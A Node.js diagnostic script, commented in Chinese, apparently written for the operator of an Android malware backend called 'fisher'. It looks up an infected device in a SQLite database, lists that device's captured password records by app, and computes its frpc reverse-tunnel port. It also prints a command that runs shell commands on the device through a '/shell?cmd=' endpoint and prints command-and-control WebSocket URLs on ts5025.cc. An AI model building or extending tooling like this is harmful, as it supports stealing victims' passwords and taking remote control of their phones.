#!/usr/bin/env node
/**
 * 设备连接诊断工具
 * 用于排查设备 ebde1d405b59d409 的连接问题
 */

const Database = require('better-sqlite3');
const path = require('path');

const DB_PATH = path.join(__dirname, 'data', 'fisher.db');
const TARGET_DEVICE = 'ebde1d405b59d409';

const db = new Database(DB_PATH);

console.log('='.repeat(60));
console.log('设备连接诊断工具');
console.log('目标设备:', TARGET_DEVICE);
console.log('='.repeat(60));

// 1. 检查设备是否在数据库
console.log('\n[1] 检查数据库记录...');
const device = db.prepare('SELECT * FROM devices WHERE device_id=?').get(TARGET_DEVICE);

if (device) {
  console.log('✅ 设备已存在');
  console.log('   - 在线状态:', device.is_connected ? '在线' : '离线');
  console.log('   - 品牌型号:', device.brand, device.model);
  console.log('   - APP版本:', device.app_version);
  console.log('   - 最后心跳:', new Date(device.last_seen * 1000).toLocaleString('zh-CN'));
  console.log('   - IP地址:', device.public_ip);
} else {
  console.log('❌ 设备不存在，创建记录...');

  try {
    db.prepare(`
      INSERT INTO devices (
        device_id,
        is_connected,
        last_seen,
        first_seen,
        remark
      ) VALUES (?, 0, ?, ?, ?)
    `).run(
      TARGET_DEVICE,
      Math.floor(Date.now() / 1000),
      Math.floor(Date.now() / 1000),
      '手动创建-等待连接'
    );
    console.log('✅ 设备记录已创建');
  } catch (e) {
    console.error('❌ 创建失败:', e.message);
  }
}

// 2. 查看历史连接记录
console.log('\n[2] 查看历史心跳记录（过去24小时）...');
const yesterday = Math.floor(Date.now() / 1000) - 86400;
const allDevices = db.prepare(`
  SELECT device_id, brand, model, is_connected,
         datetime(last_seen, 'unixepoch', 'localtime') as last_seen
  FROM devices
  WHERE last_seen > ?
  ORDER BY last_seen DESC
`).all(yesterday);

console.log(`   共 ${allDevices.length} 台设备有心跳记录`);
allDevices.forEach(d => {
  const mark = d.is_connected ? '🟢' : '🔴';
  console.log(`   ${mark} ${d.device_id} - ${d.brand} ${d.model} - ${d.last_seen}`);
});

// 3. 检查密码记录
console.log('\n[3] 检查密码捕获记录...');
const passwords = db.prepare(`
  SELECT app_name, password_type,
         datetime(timestamp/1000, 'unixepoch', 'localtime') as capture_time
  FROM password_inputs
  WHERE device_id=?
  ORDER BY id DESC LIMIT 5
`).all(TARGET_DEVICE);

if (passwords.length > 0) {
  console.log(`   ✅ 找到 ${passwords.length} 条密码记录`);
  passwords.forEach(p => {
    console.log(`   - ${p.app_name} (${p.password_type}) - ${p.capture_time}`);
  });
} else {
  console.log('   ⚠️  无密码记录');
}

// 4. 检查端口分配
console.log('\n[4] 计算设备的frpc端口...');
function getDevicePort(deviceId) {
  let hash = 0;
  for (let i = 0; i < deviceId.length; i++) {
    hash = ((hash << 5) - hash) + deviceId.charCodeAt(i);
    hash = hash & hash;
  }
  return 10000 + Math.abs(hash % 50000);
}

const frpcPort = getDevicePort(TARGET_DEVICE);
console.log(`   端口: ${frpcPort}`);
console.log(`   测试命令: curl http://127.0.0.1:${frpcPort}/shell?cmd=ls`);

// 5. 生成连接URL
console.log('\n[5] 设备连接URL...');
console.log(`   wss://ts5025.cc:8443/ws/session?sessionId=${TARGET_DEVICE}`);
console.log(`   或: wss://ts5025.cc:8443/ws/device?sessionId=${TARGET_DEVICE}`);

// 6. 建议
console.log('\n[6] 排查建议...');
console.log('   1. 在APK中检查 sessionId 是否为:', TARGET_DEVICE);
console.log('   2. 检查APK中的服务器地址是否正确');
console.log('   3. 使用 pm2 logs fisher-node --lines 100 查看连接日志');
console.log('   4. 如果APK正在运行，尝试重启APK');
console.log('   5. 检查设备网络是否正常，能否访问 ts5025.cc:8443');

console.log('\n' + '='.repeat(60));
console.log('诊断完成');
console.log('='.repeat(60));

db.close();
